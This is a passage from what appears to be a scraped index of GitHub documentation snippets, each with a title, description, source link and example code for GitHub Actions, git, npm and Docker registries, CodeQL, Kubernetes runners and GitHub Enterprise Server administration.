create_check_run\n        # ADD REQUESTED_ACTION METHOD HERE #\n        end\n      end\n```\n\n----------------------------------------\n\nTITLE: Travis CI Config File Format\nDESCRIPTION: This YAML configuration file format is used for auditing a Travis CI instance using the `--config-file-path` argument. It specifies the repository slug and the path to the `.travis.yml` file for each repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nsource_files:\n  - repository_slug: travis-org-name/travis-repo-name\n    path: path/to/.travis.yml\n  - repository_slug: travis-org-name/some-other-travis-repo-name\n    path: path/to/.travis.yml\n```\n\n----------------------------------------\n\nTITLE: Limiting Parallel Matrix Jobs - YAML\nDESCRIPTION: This YAML snippet demonstrates how to limit the maximum number of parallel jobs to 2 when using a matrix strategy in a GitHub Actions workflow. The `max-parallel` key under the `strategy` section is set to 2, restricting concurrent job execution.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-a-build-matrix-for-your-jobs-max-parallel.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      max-parallel: 2\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]\n```\n\n----------------------------------------\n\nTITLE: Building From Upstream: Jenkins Pipeline (YAML)\nDESCRIPTION: Configures a Jenkins pipeline to trigger builds based on successful completions of upstream projects ('job1,job2'). Requires the Jenkins 'Upstream' plugin.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\npipeline {\n  triggers {\n    upstream(\n      upstreamProjects: 'job1,job2',\n      threshold: hudson.model.Result.SUCCESS\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting GPG Primary Key in Git Configuration (Shell)\nDESCRIPTION: This snippet sets the global Git configuration to use a specific GPG primary key for signing commits. The `git config` command with the `--global` flag modifies the global Git configuration file. Replace `3AA5C34371567BD2` with your actual GPG primary key ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/paste-gpg-key-id.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit config --global user.signingkey 3AA5C34371567BD2\n```\n\n----------------------------------------\n\nTITLE: Referencing Reusable Content with Indentation - Markdown\nDESCRIPTION: This code snippet demonstrates how to reference a reusable content file with indentation in a Markdown list. It uses the `indented_data_reference` Liquid tag and specifies the number of spaces for indentation using the `spaces` argument. This ensures the reusable content aligns properly within the list structure.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/README.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n1. My first list item\n{% indented_data_reference reusables.foo.par spaces=2 %}\n1. My second list item\n```\n\n----------------------------------------\n\nTITLE: GitHub GraphQL API URL for GitHub Enterprise Server\nDESCRIPTION: This code snippet highlights the GraphQL API URL for GitHub Enterprise Server (GHES), demonstrating the need to use the GHES-specific URL when querying the GraphQL endpoint. The `HOSTNAME` variable should be replaced with the actual hostname of the GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/making-your-github-app-available-for-github-enterprise-server.md#_snippet_1\n\nLANGUAGE: none\nCODE:\n```\n`https://api.github.com/graphql` | `https://HOSTNAME/api/v3/graphql`\n```\n\n----------------------------------------\n\nTITLE: Updating All Group Attributes via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP PUT request used to update all attributes for an existing group in GitHub using the SCIM API.  The request updates all of the attributes for an existing group.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_4\n\nLANGUAGE: HTTP\nCODE:\n```\nPUT /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups/{scim_group_id}\n```\n\n----------------------------------------\n\nTITLE: Viewing Firewall Status Numbered UFW\nDESCRIPTION: This snippet demonstrates how to check the status and rules of the UFW firewall with line numbers. The `sudo ufw status numbered` command is used to display active firewall rules along with their corresponding numbers, facilitating easier management and manipulation of specific rules.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-built-in-firewall-rules.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo ufw status numbered\n```\n\n----------------------------------------\n\nTITLE: Defining GraphQL Query Variable\nDESCRIPTION: This snippet demonstrates how to define a variable for a GraphQL query. The variable `number_of_repos` is defined within a `variables` object.  The variable's value is set to 3, which is an integer. This variable will later be used in the GraphQL query to specify the number of repositories to fetch.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nvariables {\n   \"number_of_repos\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: Reading STATE Value in JavaScript\nDESCRIPTION: This JavaScript snippet shows how to read a value from an environment variable created by writing to the `GITHUB_STATE` file.  It assumes that a previous action has created an environment variable named `STATE_processID` and logs its value to the console.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_26\n\nLANGUAGE: javascript\nCODE:\n```\nconsole.log(\"The running PID from the main action is: \" + process.env.STATE_processID);\n```\n\n----------------------------------------\n\nTITLE: Deleting a local Git repository directory\nDESCRIPTION: This command deletes a local directory containing a Git repository.  It uses the `rm -rf` command, which recursively and forcefully removes the specified directory and its contents. Be cautious when using this command, as it permanently deletes data.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-your-personal-account/best-practices-for-leaving-your-company.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nrm -rf WORK_DIRECTORY\n```\n\n----------------------------------------\n\nTITLE: Referencing static CSS file in HTML template\nDESCRIPTION: This code shows how to link a static CSS file in the HTML template using Flask's `url_for` function. This assumes the CSS file is located in the 'static' directory and resolves issues with CSS styles not being applied.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n{% raw %}\n<link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\">\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Configure npm registry with GitHub Packages URL (subdomain isolation disabled)\nDESCRIPTION: This shell command configures the npm registry to use the GitHub Packages URL when subdomain isolation is disabled. Replace `NAMESPACE` with the user or organization account that owns the repository, and `HOSTNAME` with the appropriate hostname. The registry URL is `https://HOSTNAME/_registry/npm`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/create-npmrc-owner-step.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n@NAMESPACE:registry=https://HOSTNAME/_registry/npm\n```\n\n----------------------------------------\n\nTITLE: Parameter File Path Name Example in Azure Pipelines YAML\nDESCRIPTION: This YAML snippet demonstrates how to define a parameter with a default value and use it to specify a template path in an Azure Pipelines configuration file. The template parameter defaults to 'simple_step.yml'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\nparameters:\n- name: template\n  type: string\n  default: simple_step.yml\n\nsteps:\n- template: \"./templates/{% raw %}${{ parameters.template }}{% endraw %}\"\n```\n\n----------------------------------------\n\nTITLE: Creating a Kubernetes Secret for Proxy Credentials\nDESCRIPTION: This command creates a Kubernetes secret named `proxy-auth` in the `arc-runners` namespace, containing the username and password for an authenticated proxy. This secret is referenced in the proxy configuration to provide credentials for the proxy.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nkubectl create secret generic proxy-auth \\\n    --namespace=arc-runners \\\n    --from-literal=username=proxyUsername \\\n    --from-literal=password=proxyPassword\n```\n\n----------------------------------------\n\nTITLE: Copying SSH Public Key to Clipboard (Windows/PowerShell)\nDESCRIPTION: Copies the content of the id_ed25519.pub file to the clipboard on Windows when using PowerShell or {% data variables.product.prodname_windows_terminal %}. This avoids the `ParseError` associated with the `<` operator by using `cat` and piping the output to `clip`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-ssh-public-key.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ cat ~/.ssh/id_ed25519.pub | clip\n# Copies the contents of the id_ed25519.pub file to your clipboard\n```\n\n----------------------------------------\n\nTITLE: Checking runner service status with launchctl on macOS\nDESCRIPTION: This command uses the `svc.sh` script to check the status of the self-hosted runner application service using `launchctl` on macOS. The output includes the process ID and the name of the application's `launchd` service. Requires `svc.sh` script in the runner directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n$ ./svc.sh status\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on push and fork events - YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to trigger on both `push` and `fork` events. The `on` keyword specifies the events that will trigger the workflow. When a push occurs to any branch or a fork event happens the workflow will run.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/on-multiple-example.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non: [push, fork]\n```\n\n----------------------------------------\n\nTITLE: Encoding Service Account Key as Base64\nDESCRIPTION: This command reads the contents of the `key.json` file, encodes it in Base64, and stores it in the `GKE_SA_KEY` environment variable. This is a common practice for storing sensitive data, such as service account keys, as environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nexport GKE_SA_KEY=$(cat key.json | base64)\n```\n\n----------------------------------------\n\nTITLE: Verifying a Signed Git Tag\nDESCRIPTION: This command verifies a signed Git tag using the `git tag -v` command. The command checks the signature against the user's keyring or configured signing method. This allows users to confirm the tag's integrity and author.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/signing-tags.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ git tag -v MYTAG\n# Verifies the signed tag\n```\n\n----------------------------------------\n\nTITLE: Configure npm registry with GitHub Packages URL (subdomain isolation enabled)\nDESCRIPTION: This shell command configures the npm registry to use the GitHub Packages URL when subdomain isolation is enabled. Replace `NAMESPACE` with the user or organization account that owns the repository, and `HOSTNAME` with the appropriate hostname. The registry URL is `https://npm.HOSTNAME`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/create-npmrc-owner-step.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n@NAMESPACE:registry=https://npm.HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Download all workflow artifacts using gh CLI\nDESCRIPTION: Downloads all artifacts generated by a workflow run using the `gh run download` subcommand.  `RUN_ID` is replaced with the ID of the desired run. If `RUN_ID` is not specified, the CLI presents an interactive menu for selecting a recent run. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh run download RUN_ID\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub.com URLs for action downloads (GHES)\nDESCRIPTION: This code snippet lists the GitHub.com URLs that a self-hosted runner needs to access if it's enabled to automatically download actions from GitHub.com in a GitHub Enterprise Server environment. This access is required for the runner to fetch actions required by workflows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/communicating-with-self-hosted-runners.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngithub.com\napi.github.com\ncodeload.github.com\npkg.actions.githubusercontent.com\n```\n\n----------------------------------------\n\nTITLE: Configuring Publish Settings in package.json\nDESCRIPTION: This JSON snippet shows how to specify the publish configuration in the `package.json` file.  It sets the registry for packages within the `@YOUR-USERNAME` scope to the GitHub Package Registry. Replace `YOUR-USERNAME` with your GitHub username.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n\"publishConfig\": {\n  \"@YOUR-USERNAME:registry\": \"https://npm.pkg.github.com\"\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying Deployment Scope Locks in Azure\nDESCRIPTION: This error code indicates that there are locks on the Azure subscription or resource group, preventing the creation or deletion of network interfaces (NICs). These locks can hinder the scaling and operation of GitHub-hosted runners.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nRunnerDeploymentScopeLocked\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Syntax for Caching (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to cache node modules in a GitHub Actions workflow. It uses the `actions/cache` action to cache the `~/.npm` directory based on the `package-lock.json` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Cache node modules\n  uses: {% data reusables.actions.action-cache %}\n  with:\n    path: ~/.npm\n    key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n    restore-keys: v1-npm-deps-\n```\n\n----------------------------------------\n\nTITLE: Analyzing Database with CodeQL Pack (Shell)\nDESCRIPTION: This command analyzes a specified CodeQL database using a CodeQL pack.  It requires the database path, scope (organization name), pack name, and optionally, a version number and a path to a query or query suite. The command executes the default query suite of the pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <database> <scope>/<pack>@x.x.x:<path>\n```\n\n----------------------------------------\n\nTITLE: Configuring Helm with username and password\nDESCRIPTION: This snippet shows how to configure Dependabot to authenticate with a Helm registry using a username and password in the `dependabot.yml` file.  The registry type, URL, username, and password (stored as a secret) are specified.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  helm_registry:\n    type: helm-registry\n    url: https://registry.example.com\n    username: octocat\n    password: ${{secrets.MY_REGISTRY_PASSWORD}}\n```\n\n----------------------------------------\n\nTITLE: Applying Cluster Configuration (Shell)\nDESCRIPTION: This command applies the cluster configuration to the GitHub Enterprise Server cluster. It is typically run after upgrading the nodes and ensures that the cluster is configured correctly.  It relies on the `ghe-cluster-config-apply` command line utility, and should be run from the administrative shell of the primary MySQL node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-config-apply\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Left and Right Whitespace Trim\nDESCRIPTION: This snippet uses the `ifversion` tag with both left and right whitespace trim characters (`{%-` and `-%}`) to remove leading and trailing whitespace around the tag. It checks if the version is `fpt` or if `ghes > 2.13`.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- ifversion fpt or ghes > 2.13 %}\n  Alpha\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Calling Workflow in Local Repository (SHA)\nDESCRIPTION: This snippet calls a workflow named 'workflow-1.yml' located in the '.github/workflows' directory of the 'octo-org/this-repo' repository, using a specific commit SHA. It demonstrates how to reference a specific version of the workflow.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/uses-keyword-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  call-workflow-1-in-local-repo:\n    uses: octo-org/this-repo/.github/workflows/workflow-1.yml@172239021f7ba04fe7327647b213799853a9eb89\n```\n\n----------------------------------------\n\nTITLE: Generating GitHub's Syntax Highlighting CSS\nDESCRIPTION: This shell command uses `rougify` to generate CSS styles that match GitHub's syntax highlighting theme. The output is redirected to a `style.css` file, which can then be included in a project's stylesheet to provide consistent syntax highlighting.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/about-github-pages-and-jekyll.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nrougify style github > style.css\n```\n\n----------------------------------------\n\nTITLE: Creating a Commit Message (CLI)\nDESCRIPTION: This shell script demonstrates how to start a commit message with a short description using `git commit -m`. The following lines indicate the addition of two empty lines after the description for the `on-behalf-of` trailer which comes next. \nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/creating-a-commit-on-behalf-of-an-organization.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ git commit -m \"Refactor usability tests.\n>\n> \n```\n\n----------------------------------------\n\nTITLE: Testing GitHub Actions Storage with OIDC (ghe-actions-test-storage-with-oidc)\nDESCRIPTION: This command checks the blob storage configuration for GitHub Actions when OpenID Connect (OIDC) is used for authentication. Requires the provider (`-p`) and connection string (`-cs`) as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_69\n\nLANGUAGE: shell\nCODE:\n```\nghe-actions-test-storage-with-oidc -p [PROVIDER] -cs [\"CONNECTION-STRING\"]\n```\n\n----------------------------------------\n\nTITLE: Pip: Configuring index-url in pip.conf\nDESCRIPTION: This snippet shows how to set the `index-url` in the `pip.conf` file to point to a private registry. This configuration ensures that Pip uses the specified private registry as the primary source for Python packages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n[global]\ntimeout = 60\nindex-url = https://private_registry_url\n```\n\n----------------------------------------\n\nTITLE: Submitting Requests Address\nDESCRIPTION: This code snippet shows the physical address to send legal requests to GitHub, including the c/o Corporation Service Company address and suite number in Sacramento, CA.  It also mentions the email address for courtesy copies.\nSOURCE: https://github.com/github/docs/blob/main/content/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nGitHub, Inc.\nc/o Corporation Service Company\n2710 Gateway Oaks Drive, Suite 150N\nSacramento, CA 95833-3505\n```\n\n----------------------------------------\n\nTITLE: Bundling a QL library pack\nDESCRIPTION: This command bundles a QL library pack from the contents of the current directory using the `codeql pack bundle` command. It includes options for specifying the output file, thread count, RAM usage, and other advanced configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-bundle.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack bundle [--output=<file.tgz>] [--threads=<num>] [--ram=<MB>] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Forwarding Ports in Codespace using GitHub CLI\nDESCRIPTION: This command forwards a port from a codespace to a local port. The syntax is `CODESPACE-PORT_NAME:LOCAL-PORT-NAME`. The `-c` flag specifies the codespace name. The port remains forwarded until the process is terminated. Use Control+C to stop.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace ports forward CODESPACE-PORT_NAME:LOCAL-PORT-NAME -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Setting Up a GHES Replica Node\nDESCRIPTION: This command configures a node to be a high availability replica. It establishes a WireGuard VPN tunnel, configures database replication, and disables application services. Replace PRIMARY-NODE-IP with the IP address of the primary node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_74\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup PRIMARY-NODE-IP\n```\n\n----------------------------------------\n\nTITLE: Checking Controller Logs - Bash\nDESCRIPTION: This bash command uses `kubectl` to retrieve the logs of the controller pod.  It filters pods by the `app.kubernetes.io/name` label and requires specifying the controller's namespace.  Replace `<CONTROLLER_NAMESPACE>` with the actual namespace where the controller is deployed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nkubectl logs -n <CONTROLLER_NAMESPACE> -l app.kubernetes.io/name=gha-runner-scale-set-controller\n```\n\n----------------------------------------\n\nTITLE: Gradle build.gradle Configuration\nDESCRIPTION: This snippet shows a `build.gradle` file configuration for Gradle, specifying the private registry URL within the `repositories` section. This ensures that Gradle resolves dependencies from the specified private Maven repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_3\n\nLANGUAGE: groovy\nCODE:\n```\n# Example build.gradle file\n\nrepositories {\n    maven {\n        url \"https://private_registry_url\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Completion of Another Workflow\nDESCRIPTION: This YAML snippet configures a workflow to run automatically when the 'Run Tests' workflow completes.  The `workflow_run` trigger is used, specifying the `workflows` and `types` to listen for. This demonstrates how to chain workflows based on completion events.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_55\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_run:\n    workflows: [Run Tests]\n    types:\n      - completed\n```\n\n----------------------------------------\n\nTITLE: Pushing Docker Image to GCR\nDESCRIPTION: This command pushes a Docker image to Google Container Registry (GCR) using the `docker push` command. The image is identified by its GCR repository path, which includes the project ID, image name, and SHA of the GitHub commit.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ndocker push \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\"\n```\n\n----------------------------------------\n\nTITLE: Migrating CircleCI project to GitHub Actions\nDESCRIPTION: This command migrates a CircleCI project to a GitHub Actions workflow. It requires the `gh actions-importer` tool to be installed.  It specifies the target GitHub repository, output directory for logs and artifacts, and the CircleCI project name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate circle-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --circle-ci-project my-circle-ci-project\n```\n\n----------------------------------------\n\nTITLE: Autobuild Process for Java\nDESCRIPTION: The autobuild process for Java determines the build system (Gradle, Maven, or Ant) by searching for build files. It runs the first build file found in the root directory or a single subdirectory containing build files. If multiple subdirectories contain build files, an error is reported.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_11\n\n\n\n----------------------------------------\n\nTITLE: Pushing changes to feature branch in Git repository\nDESCRIPTION: This snippet demonstrates pushing changes to a feature branch within a GitHub Codespaces environment. It uses the `git push` command with `origin` as the remote, referring to the user's fork, and specifies the `my-feature-branch` as the target branch.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-source-control-in-your-codespace.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit push origin my-feature-branch\n```\n\n----------------------------------------\n\nTITLE: Specifying only a container image (YAML)\nDESCRIPTION: This YAML snippet shows a simplified way to specify a container image for a job. When only the image is needed, the `image` keyword can be omitted, and the image name can be directly assigned to the `container` property.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-running-jobs-in-a-container.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container: node:18\n```\n\n----------------------------------------\n\nTITLE: Checking Replication Status using `ghe-repl-status`\nDESCRIPTION: This snippet describes how to monitor the replication status of an existing replica node by connecting to the node's administrative console (SSH) and running the `ghe-repl-status` command-line utility.  The output conforms to the expectations of Nagios' check_by_ssh plugin.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/monitoring-a-high-availability-configuration.md#_snippet_0\n\n\n\n----------------------------------------\n\nTITLE: Shell script example for ENTRYPOINT\nDESCRIPTION: This shell script is designed to be used as an entrypoint for a Docker container. It prints the number of arguments and their values to the standard output. The script requires a shebang to specify the shell interpreter and should be executable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/dockerfile-support-for-github-actions.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n#!/bin/sh\n\n# `$#` expands to the number of arguments and `$@` expands to the supplied `args`\nprintf '%d args:' \"$#\"\nprintf \" '%s'\" \"$@\"\nprintf '\\n'\n```\n\n----------------------------------------\n\nTITLE: Connecting to Replica via SSH\nDESCRIPTION: This command establishes an SSH connection to the replica appliance using the 'admin' user and port 122.  `REPLICA_IP` should be replaced with the actual IP address of the replica appliance. This allows for administrative access to configure the replica.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@REPLICA_IP\n```\n\n----------------------------------------\n\nTITLE: Exporting Migration Archive\nDESCRIPTION: This snippet shows how to generate the migration archive using the `ghe-migrator export` command. The `-g` flag is used to specify the Migration GUID, ensuring that the export includes all added repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-migrator export -g MIGRATION-GUID\n> Archive saved to: /data/github/current/tmp/MIGRATION-GUID.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Defining a Library Pack in qlpack.yml (YAML)\nDESCRIPTION: This snippet illustrates how to define a library pack. Setting `library: true` indicates that the pack does not contain queries and is not compiled. Query packs can ignore this field or explicitly set it to `false`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_13\n\nLANGUAGE: YAML\nCODE:\n```\nlibrary: true\n```\n\n----------------------------------------\n\nTITLE: Annotated JavaScript Console Logs\nDESCRIPTION: This JavaScript snippet demonstrates the use of `console.log` to print messages to the console. The annotations explain the purpose of each `console.log` statement, clarifying what the code is intended to output. This example showcases basic JavaScript syntax and the use of comments for annotation.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/code-annotations.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n// Greet the world!\nconsole.log(\"Hello, world!\")\n\n// What about Saturn?\nconsole.log(\"Hello, Saturn!\")\n```\n\n----------------------------------------\n\nTITLE: Running codeql pack packlist command in shell\nDESCRIPTION: This command computes the set of files to be included in a QL query pack or library pack, using the patterns in `.gitignore` files.  The `<dir>` argument specifies the root directory of the package.  The `--format` option can be used to specify the output format.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-packlist.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack packlist <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Defining Language Bytes in Ruby\nDESCRIPTION: This Ruby code defines a hash representing language bytes, mapping the name to language byte count. It's used to structure the data before serialization into JSON for use in the JavaScript D3 treemap.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_11\n\nLANGUAGE: Ruby\nCODE:\n```\nlanguage_bytes = [ :name => \"language_bytes\", :elements => language_byte_count]\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent in Git Bash\nDESCRIPTION: This snippet demonstrates how to start the ssh-agent in Git Bash.  It uses the eval command to execute the output of `ssh-agent -s`, which sets the necessary environment variables. The expected output includes the agent's process ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/desktop/windows_git_bash_turn_on_ssh_agent.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# start the ssh-agent in the background\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n```\n\n----------------------------------------\n\nTITLE: Publishing a Docker image (GHES)\nDESCRIPTION: This command publishes a Docker image to the GitHub Packages registry on a GitHub Enterprise Server (GHES) instance. It requires the OWNER, REPOSITORY, IMAGE_NAME, VERSION and HOSTNAME to be specified. It includes variations for subdomain isolation enabled and disabled.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ndocker push 